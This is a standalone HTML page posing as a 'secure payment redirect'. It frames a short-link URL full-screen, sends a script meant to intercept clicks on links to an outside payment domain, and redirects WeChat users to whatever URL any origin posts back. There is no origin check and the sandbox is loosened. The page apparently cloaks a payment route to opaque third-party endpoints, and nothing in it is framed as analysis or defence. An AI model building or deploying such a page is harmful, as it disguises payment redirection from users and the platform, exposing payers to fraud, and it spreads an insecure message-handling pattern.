
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>安全支付跳转</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: #f5f5f5;
        }
        #frame-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        #loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: Arial;
        }
        #wechat-tip {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            color: white;
            text-align: center;
            padding-top: 30%;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div id="loading">正在安全跳转中...</div>
    <div id="frame-container"></div>
    <div id="wechat-tip">
        <h2>支付提示</h2>
        <p>正在为您调起微信支付...</p>
    </div>

    <script>
        // 配置参数
        const CONFIG = {
            target: 'https://xz.xffwz.com/s/TURBd01EQXdNREF3TUg3TGVIQQ',
            proxies: [
                'https://xz.xffwz.com/s/TURBd01EQXdNREF3TUg3TGVIQQ',
                'https://xz.xffwz.com/s/TURBd01EQXdNREF3TUg3TGVIQQ'
            ],
            wechatPayUrls: [
                'pay.xffuw.com',
                'pay.xffuw.com'
            ]
        };

        // 检测微信环境
        function isWeChat() {
            return /MicroMessenger/i.test(navigator.userAgent);
        }

        // 处理支付链接
        function handleWeChatPay(url) {
            document.getElementById('wechat-tip').style.display = 'block';
            setTimeout(() => {
                window.location.href = url;
            }, 500);
        }

        // 初始化iframe
        function initFrame() {
            const container = document.getElementById('frame-container');
            const iframe = document.createElement('iframe');
            
            // 增强sandbox权限
            iframe.setAttribute('sandbox', 
                'allow-same-origin allow-forms allow-scripts allow-popups allow-top-navigation');
            
            iframe.style.width = '100%';
            iframe.style.height = '100%';
            
            // 随机选择代理
            const proxyUrl = CONFIG.proxies[Math.floor(Math.random() * CONFIG.proxies.length)] + 
                           '?url=' + encodeURIComponent(CONFIG.target);
            
            iframe.src = proxyUrl;
            container.appendChild(iframe);

            // 监听支付请求
            window.addEventListener('message', (e) => {
                if (e.data.type === 'PAYMENT_REQUEST') {
                    if (isWeChat()) {
                        handleWeChatPay(e.data.url);
                    } else {
                        window.open(e.data.url, '_blank');
                    }
                }
            });

            iframe.onload = () => {
                document.getElementById('loading').style.display = 'none';
                
                // 注入支付检测脚本
                iframe.contentWindow.postMessage({
                    type: 'INJECT_SCRIPT',
                    script: `
                        document.addEventListener('click', (e) => {
                            const link = e.target.closest('a');
                            if (link && ${JSON.stringify(CONFIG.wechatPayUrls)}.some(
                                domain => link.href.includes(domain))) {
                                e.preventDefault();
                                parent.postMessage({
                                    type: 'PAYMENT_REQUEST',
                                    url: link.href
                                }, '*');
                            }
                        }, true);
                    `
                }, '*');
            };
        }

        window.onload = initFrame;
    </script>
</body>
</html>
